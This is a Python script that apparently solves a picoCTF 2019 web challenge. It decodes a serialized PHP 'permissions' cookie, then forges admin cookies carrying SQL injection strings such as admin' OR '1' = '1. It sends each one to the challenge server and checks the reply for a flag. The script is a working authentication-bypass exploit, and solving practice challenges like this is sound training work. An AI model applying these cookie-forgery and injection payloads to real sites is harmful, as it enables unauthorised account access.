import texttable as ttb
import os
from bs4 import BeautifulSoup
import HHCTF.util as hutil
import HHCTF.util as hu

hashed = 'TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D'
hashed = hu.from_url(hashed)
print(hashed)
hashed = hu.from_url(hashed)
print(hashed)

raw = hu.to_ascii(hu.from_base64(hashed))
print(raw)

print('')
print('')
print('')



class pycolor:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    PURPLE = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    END = '\033[0m'
    BOLD = '\038[1m'
    UNDERLINE = '\033[4m'
    INVISIBLE = '\033[08m'
    REVERCE = '\033[07m'


def check(body):
    if "Flag:" in body:
        return "Got a flag."
    if "regular user page" in body:
        return "regular user"
    print(pycolor.YELLOW + "~~~~~ unknown response ~~~~~")
    print(body)
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~" + pycolor.END)
    return "unknown"


url = "https://2019shell1.picoctf.com/problem/12279/index.php?file=login"
queries = [
    ["admin' OR '1' = '1"],
    ["' OR 1 --"],
    ["'=''or'"],
]
res = [["Password", "Result"]]

for q in queries:
    pas = q[0]

    cook = 'O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:' + str(len(pas)) + ':"' + pas + '";}'
    print(cook)
    cook = hu.to_url(hu.to_url(hu.to_base64(cook)))
    print(cook)
    html = hutil.get_file_via_internet(url, {}, {"user_info": cook})

    res.append([pas, check(html)])




table = ttb.Texttable()  # 表型作成(大きさは以下の情報から決める）
table.set_deco(ttb.Texttable.HEADER)
table.set_cols_align(["c", "c"])  # 文字の配置,たぶんl(左揃え）r（右揃え）c（中央）
table.set_cols_valign(["t", "t"])  # 表示属性
table.add_rows(res)
print(table.draw())  # 表示
